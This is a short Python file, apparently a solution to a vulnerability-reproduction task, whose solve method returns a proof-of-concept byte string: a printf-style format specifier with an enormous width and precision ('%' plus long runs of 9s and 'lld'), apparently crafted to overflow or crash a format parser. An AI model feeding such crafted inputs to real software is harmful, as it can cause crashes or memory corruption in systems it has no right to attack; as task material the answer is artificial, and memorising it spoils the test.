class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%' + b'9' * 16 + b'.' + b'9' * 19 + b'lld'
        return poc